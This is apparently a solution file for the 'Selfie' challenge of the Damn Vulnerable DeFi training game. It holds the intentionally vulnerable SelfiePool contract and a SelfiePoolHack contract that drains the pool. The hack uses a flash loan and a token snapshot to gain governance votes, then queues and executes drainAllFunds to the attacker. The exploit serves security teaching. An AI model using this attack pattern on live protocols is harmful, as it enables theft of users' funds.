pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";

contract SelfiePool is ReentrancyGuard {
    using Address for address payable;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        require(
            msg.sender == address(governance),
            "Only governance can execute this action"
        );
        _;
    }

    constructor(address tokenAddress, address governanceAddress) public {
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        token.transfer(msg.sender, borrowAmount);

        require(msg.sender.isContract(), "Sender must be a deployed contract");
        (bool success, ) = msg.sender.call(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );
        require(success, "External call failed");

        uint256 balanceAfter = token.balanceOf(address(this));

        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }

    function drainAllFunds(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
}

contract SelfiePoolHack {
    uint public actionId;

    DamnValuableToken public token;
    SelfiePool public pool;
    SimpleGovernance public governance;

    constructor(address _token, address _pool, address _governance) {
        token = DamnValuableToken(_token);
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
    }

    fallback() external {
        token.snapshot();
        token.transfer(address(pool), token.balanceOf(address(this)));
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));

        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(msg.sender)
            ),
            0
        );
    }

    function attack2() external {
        governance.executeAction(actionId);
    }
}
